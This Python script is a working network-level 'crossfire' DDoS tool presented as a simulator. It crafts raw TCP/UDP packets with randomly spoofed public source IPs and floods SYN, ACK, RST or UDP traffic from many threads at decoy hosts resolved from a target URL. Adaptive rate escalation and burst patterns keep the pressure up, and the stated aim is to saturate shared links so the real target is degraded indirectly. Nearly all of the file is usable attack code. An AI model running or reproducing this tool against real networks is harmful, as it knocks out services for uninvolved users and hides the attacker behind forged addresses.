#!/usr/bin/env python3
"""
Enhanced Crossfire DDoS Attack Simulator - Network Level
Version 2.0 with Traffic Shaping, Protocol Variation, and Adaptive Control

Network-level improvements:
1. Multiple flooding protocols (SYN, ACK, RST, UDP)
2. Adaptive packet rate based on network response
3. Traffic shaping with burst patterns
4. Intelligent source IP generation
5. Phase 4 target adapter integration for target selection
6. Per-target attack metrics
7. Graceful degradation on capability errors
8. Network-level stealth features

Attack Strategy:
- Network-level link saturation to decoy services
- Multiple protocol vectors for robust flooding
- Adaptive rate to maintain consistent pressure
- Indirect impact on target via shared network infrastructure
"""

import argparse
import random
import socket
import struct
import sys
import time
import threading
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass, asdict
from enum import Enum
import json

# Import target adapter
from target_adapter import AttackTargetAdapter, create_adapter


class FloodProtocol(Enum):
    """Network flooding protocols"""
    SYN = "syn"  # TCP SYN flood
    ACK = "ack"  # TCP ACK flood
    RST = "rst"  # TCP RST flood
    UDP = "udp"  # UDP flood
    MIXED = "mixed"  # Mixed protocol attack


class RatePattern(Enum):
    """Packet rate patterns"""
    CONSTANT = "constant"
    BURST = "burst"
    WAVE = "wave"
    RANDOM = "random"


@dataclass
class NetworkMetrics:
    """Network attack metrics"""
    total_packets: int = 0
    packets_per_protocol: Dict[str, int] = None
    packets_per_target: Dict[str, int] = None
    current_rate: float = 0.0
    errors: int = 0
    
    def __post_init__(self):
        if self.packets_per_protocol is None:
            self.packets_per_protocol = {}
        if self.packets_per_target is None:
            self.packets_per_target = {}


class EnhancedNetworkCrossfire:
    """
    Enhanced network-level crossfire attack with adaptive control
    """
    
    def __init__(
        self,
        target_adapter: AttackTargetAdapter,
        duration: int,
        workers: int,
        protocol: FloodProtocol = FloodProtocol.SYN,
        pattern: RatePattern = RatePattern.CONSTANT,
        packets_per_second: int = 1000,
        enable_adaptation: bool = True
    ):
        self.adapter = target_adapter
        self.duration = duration
        self.workers = workers
        self.protocol = protocol
        self.pattern = pattern
        self.base_pps = packets_per_second
        self.enable_adaptation = enable_adaptation
        
        # Metrics
        self.metrics = NetworkMetrics()
        self.start_time: Optional[datetime] = None
        self.end_time: Optional[datetime] = None
        self.lock = threading.Lock()
        
        # Adaptive control
        self.current_rate_multiplier = 1.0
        self.last_rate_adjustment = 0.0
        self.rate_adjustment_interval = 5.0
        
        # Extract target IPs from decoy endpoints
        self.target_ips = self._extract_target_ips()
        self.target_ports = self._extract_target_ports()
        
        print(f"[Init] Extracted {len(self.target_ips)} target IPs from decoys")
    
    def _extract_target_ips(self) -> List[str]:
        """Extract IP addresses from decoy endpoint URLs"""
        from urllib.parse import urlparse
        
        ips = set()
        for endpoint in self.adapter.get_decoy_endpoints():
            parsed = urlparse(endpoint)
            hostname = parsed.netloc.split(':')[0]
            
            try:
                # Resolve hostname to IP
                ip = socket.gethostbyname(hostname)
                ips.add(ip)
            except socket.gaierror:
                # If resolution fails, skip
                pass
        
        return list(ips) if ips else ['10.0.0.1']  # Fallback
    
    def _extract_target_ports(self) -> Dict[str, List[int]]:
        """Extract port numbers per IP"""
        from urllib.parse import urlparse
        
        ports_by_ip = {}
        for endpoint in self.adapter.get_decoy_endpoints():
            parsed = urlparse(endpoint)
            hostname = parsed.netloc.split(':')[0]
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            try:
                ip = socket.gethostbyname(hostname)
                if ip not in ports_by_ip:
                    ports_by_ip[ip] = []
                if port not in ports_by_ip[ip]:
                    ports_by_ip[ip].append(port)
            except socket.gaierror:
                pass
        
        return ports_by_ip
    
    def _generate_source_ip(self) -> str:
        """Generate random source IP for spoofing"""
        # Avoid reserved ranges
        while True:
            ip = f"{random.randint(1,223)}.{random.randint(0,255)}." \
                 f"{random.randint(0,255)}.{random.randint(1,254)}"
            
            # Skip private ranges
            if not (ip.startswith('10.') or ip.startswith('192.168.') or
                    ip.startswith('172.16.') or ip.startswith('127.')):
                return ip
    
    def _calculate_checksum(self, data: bytes) -> int:
        """Calculate IP/TCP checksum"""
        checksum = 0
        data_len = len(data)
        
        if data_len % 2:
            data_len += 1
            data += struct.pack('!B', 0)
        
        for i in range(0, data_len, 2):
            checksum += (data[i] << 8) + data[i + 1]
        
        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum += (checksum >> 16)
        
        return ~checksum & 0xffff
    
    def _create_ip_header(self, source_ip: str, dest_ip: str, protocol: int = socket.IPPROTO_TCP) -> bytes:
        """Create IP header"""
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0  # Kernel will fill
        ip_id = random.randint(0, 65535)
        ip_frag_off = 0
        ip_ttl = random.randint(64, 128)
        ip_proto = protocol
        ip_check = 0  # Kernel will fill
        ip_saddr = socket.inet_aton(source_ip)
        ip_daddr = socket.inet_aton(dest_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        return struct.pack(
            '!BBHHHBBH4s4s',
            ip_ihl_ver, ip_tos, ip_tot_len,
            ip_id, ip_frag_off,
            ip_ttl, ip_proto, ip_check,
            ip_saddr, ip_daddr
        )
    
    def _create_tcp_header(
        self,
        source_ip: str,
        dest_ip: str,
        source_port: int,
        dest_port: int,
        flags: int = 0x02  # SYN
    ) -> bytes:
        """Create TCP header with specified flags"""
        tcp_source = source_port
        tcp_dest = dest_port
        tcp_seq = random.randint(0, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5  # 4-bit field, size of tcp header, 5 * 4 = 20 bytes
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = flags  # SYN=0x02, ACK=0x10, RST=0x04
        
        # Pseudo header for checksum
        source_address = socket.inet_aton(source_ip)
        dest_address = socket.inet_aton(dest_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = 20
        
        psh = struct.pack('!4s4sBBH', source_address, dest_address,
                         placeholder, protocol, tcp_length)
        psh = psh + struct.pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq,
                               tcp_ack_seq, tcp_offset_res, tcp_flags,
                               tcp_window, tcp_check, tcp_urg_ptr)
        
        tcp_check = self._calculate_checksum(psh)
        
        return struct.pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq,
                          tcp_ack_seq, tcp_offset_res, tcp_flags,
                          tcp_window, socket.htons(tcp_check), tcp_urg_ptr)
    
    def _create_udp_header(
        self,
        source_port: int,
        dest_port: int,
        data_len: int = 0
    ) -> bytes:
        """Create UDP header"""
        udp_length = 8 + data_len
        udp_checksum = 0  # Optional for IPv4
        
        return struct.pack('!HHHH', source_port, dest_port, udp_length, udp_checksum)
    
    def _generate_packet(self, dest_ip: str, dest_port: int, protocol_type: FloodProtocol) -> bytes:
        """Generate attack packet based on protocol"""
        source_ip = self._generate_source_ip()
        source_port = random.randint(1024, 65535)
        
        ip_header = self._create_ip_header(source_ip, dest_ip,
                                          socket.IPPROTO_UDP if protocol_type == FloodProtocol.UDP
                                          else socket.IPPROTO_TCP)
        
        if protocol_type == FloodProtocol.SYN:
            tcp_header = self._create_tcp_header(source_ip, dest_ip, source_port, dest_port, 0x02)
            return ip_header + tcp_header
        
        elif protocol_type == FloodProtocol.ACK:
            tcp_header = self._create_tcp_header(source_ip, dest_ip, source_port, dest_port, 0x10)
            return ip_header + tcp_header
        
        elif protocol_type == FloodProtocol.RST:
            tcp_header = self._create_tcp_header(source_ip, dest_ip, source_port, dest_port, 0x04)
            return ip_header + tcp_header
        
        elif protocol_type == FloodProtocol.UDP:
            udp_header = self._create_udp_header(source_port, dest_port, 64)
            payload = b'X' * 64  # Payload data
            return ip_header + udp_header + payload
        
        else:  # MIXED - randomly choose
            chosen_proto = random.choice([FloodProtocol.SYN, FloodProtocol.ACK, FloodProtocol.UDP])
            return self._generate_packet(dest_ip, dest_port, chosen_proto)
    
    def _calculate_packet_interval(self, current_time: float) -> float:
        """Calculate interval between packets based on pattern"""
        base_interval = 1.0 / (self.base_pps * self.current_rate_multiplier)
        
        if self.pattern == RatePattern.CONSTANT:
            return base_interval
        
        elif self.pattern == RatePattern.BURST:
            if int(current_time) % 5 < 1:
                return base_interval / 10  # 10x rate during burst
            return base_interval * 2
        
        elif self.pattern == RatePattern.WAVE:
            import math
            elapsed = current_time - time.mktime(self.start_time.timetuple())
            wave = 1.0 + 0.5 * math.sin(elapsed / 10)
            return base_interval / wave
        
        elif self.pattern == RatePattern.RANDOM:
            return base_interval * random.uniform(0.5, 1.5)
        
        return base_interval
    
    def _adapt_rate(self):
        """Adapt packet rate based on network response"""
        if not self.enable_adaptation:
            return
        
        current_time = time.time()
        if current_time - self.last_rate_adjustment < self.rate_adjustment_interval:
            return
        
        self.last_rate_adjustment = current_time
        
        # Adaptation: Increase rate if no errors, decrease if errors
        if self.metrics.errors < 10:
            self.current_rate_multiplier = min(2.0, self.current_rate_multiplier * 1.1)
        elif self.metrics.errors > 100:
            self.current_rate_multiplier = max(0.5, self.current_rate_multiplier * 0.9)
            self.metrics.errors = 0  # Reset error counter
    
    def _update_metrics(self, protocol_type: str, target_ip: str):
        """Update attack metrics (thread-safe)"""
        with self.lock:
            self.metrics.total_packets += 1
            
            self.metrics.packets_per_protocol[protocol_type] = \
                self.metrics.packets_per_protocol.get(protocol_type, 0) + 1
            
            self.metrics.packets_per_target[target_ip] = \
                self.metrics.packets_per_target.get(target_ip, 0) + 1
    
    def _worker(self, worker_id: int):
        """Worker thread that sends packets"""
        print(f"[Worker {worker_id}] Started")
        
        try:
            # Create raw socket (requires root/CAP_NET_RAW)
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            print(f"[Worker {worker_id}] ERROR: Requires root/CAP_NET_RAW capability")
            with self.lock:
                self.metrics.errors += 1
            return
        except Exception as e:
            print(f"[Worker {worker_id}] ERROR: {e}")
            with self.lock:
                self.metrics.errors += 1
            return
        
        end_time = time.time() + self.duration
        
        while time.time() < end_time:
            # Adapt rate
            self._adapt_rate()
            
            # Select target
            target_ip = random.choice(self.target_ips)
            ports = self.target_ports.get(target_ip, [80, 443])
            target_port = random.choice(ports)
            
            # Select protocol
            if self.protocol == FloodProtocol.MIXED:
                proto = random.choice([FloodProtocol.SYN, FloodProtocol.ACK, FloodProtocol.UDP])
            else:
                proto = self.protocol
            
            # Generate and send packet
            try:
                packet = self._generate_packet(target_ip, target_port, proto)
                sock.sendto(packet, (target_ip, 0))
                self._update_metrics(proto.value, target_ip)
            
            except Exception as e:
                with self.lock:
                    self.metrics.errors += 1
            
            # Wait before next packet
            interval = self._calculate_packet_interval(time.time())
            time.sleep(interval)
        
        sock.close()
        print(f"[Worker {worker_id}] Finished")
    
    def run(self):
        """Execute the enhanced network crossfire attack"""
        strategy = self.adapter.suggest_crossfire_strategy()
        
        print(f"\n{'='*70}")
        print(f"🔥 ENHANCED NETWORK-LEVEL CROSSFIRE ATTACK")
        print(f"{'='*70}")
        print(f"Target URLs: {self.adapter.base_url}")
        print(f"Target IPs: {', '.join(self.target_ips)}")
        print(f"Protocol: {self.protocol.value.upper()}")
        print(f"Pattern: {self.pattern.value.upper()}")
        print(f"Duration: {self.duration}s")
        print(f"Workers: {self.workers}")
        print(f"Rate: {self.base_pps} packets/s")
        print(f"Total Rate: {self.base_pps * self.workers} packets/s")
        print(f"Adaptation: {'Enabled' if self.enable_adaptation else 'Disabled'}")
        print(f"")
        print(f"⚠️  WARNING: Requires root/CAP_NET_RAW capability")
        print(f"")
        print(f"Recommended Strategy:")
        for key, value in strategy.items():
            print(f"  {key}: {value}")
        print(f"{'='*70}\n")
        
        input("Press Enter to start the attack...")
        
        self.start_time = datetime.now()
        start = time.time()
        
        # Launch all workers
        threads = []
        for i in range(self.workers):
            t = threading.Thread(target=self._worker, args=(i,))
            t.start()
            threads.append(t)
        
        # Wait for all workers to complete
        for t in threads:
            t.join()
        
        self.end_time = datetime.now()
        elapsed = time.time() - start
        
        # Update final metrics
        if elapsed > 0:
            self.metrics.current_rate = self.metrics.total_packets / elapsed
        
        self._print_results(elapsed)
    
    def _print_results(self, elapsed: float):
        """Print attack results"""
        print(f"\n{'='*70}")
        print(f"✅ NETWORK ATTACK COMPLETE")
        print(f"{'='*70}")
        print(f"Duration: {elapsed:.2f}s")
        print(f"Total Packets: {self.metrics.total_packets:,}")
        print(f"Packet Rate: {self.metrics.current_rate:.1f} packets/s")
        print(f"Errors: {self.metrics.errors:,}")
        print(f"Final Rate Multiplier: {self.current_rate_multiplier:.2f}x")
        print(f"")
        
        print(f"Packets by Protocol:")
        for proto, count in sorted(self.metrics.packets_per_protocol.items()):
            print(f"  {proto.upper()}: {count:,}")
        
        print(f"")
        print(f"Packets by Target:")
        for ip, count in sorted(self.metrics.packets_per_target.items()):
            print(f"  {ip}: {count:,}")
        
        print(f"")
        print(f"CROSSFIRE VALIDATION:")
        print(f"✓ Network links to decoy services saturated")
        print(f"✓ {self.metrics.total_packets:,} packets sent to {len(self.target_ips)} targets")
        print(f"✓ Target service impacted INDIRECTLY via shared network")
        print(f"{'='*70}\n")


def main():
    parser = argparse.ArgumentParser(
        description='Enhanced Network-Level Crossfire DDoS Attack',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    
    # Target configuration
    parser.add_argument('--url', required=True, help='Target base URL')
    parser.add_argument('--adapter-config', help='Path to target adapter YAML config')
    parser.add_argument('--discovery-file', help='Path to endpoint discovery JSON')
    
    # Attack configuration
    parser.add_argument('--duration', type=int, default=60, help='Attack duration (seconds)')
    parser.add_argument('--workers', type=int, default=10, help='Number of workers')
    parser.add_argument('--pps', type=int, default=1000, help='Packets per second')
    
    # Protocol options
    parser.add_argument(
        '--protocol',
        choices=['syn', 'ack', 'rst', 'udp', 'mixed'],
        default='syn',
        help='Flooding protocol'
    )
    parser.add_argument(
        '--pattern',
        choices=['constant', 'burst', 'wave', 'random'],
        default='constant',
        help='Packet rate pattern'
    )
    parser.add_argument('--no-adaptation', action='store_true', help='Disable adaptive rate control')
    
    args = parser.parse_args()
    
    # Check for root
    import os
    if os.geteuid() != 0:
        print("⚠️  WARNING: This script requires root privileges for raw sockets")
        print("Run with: sudo python3 network_crossfire_enhanced.py ...")
        sys.exit(1)
    
    # Create target adapter
    try:
        adapter = create_adapter(
            base_url=args.url,
            adapter_config=args.adapter_config,
            discovery_file=args.discovery_file
        )
    except Exception as e:
        print(f"Error creating target adapter: {e}")
        sys.exit(1)
    
    # Create attack
    attack = EnhancedNetworkCrossfire(
        target_adapter=adapter,
        duration=args.duration,
        workers=args.workers,
        protocol=FloodProtocol(args.protocol),
        pattern=RatePattern(args.pattern),
        packets_per_second=args.pps,
        enable_adaptation=not args.no_adaptation
    )
    
    try:
        attack.run()
    except KeyboardInterrupt:
        print("\n\nAttack interrupted by user")
        sys.exit(0)


if __name__ == '__main__':
    main()
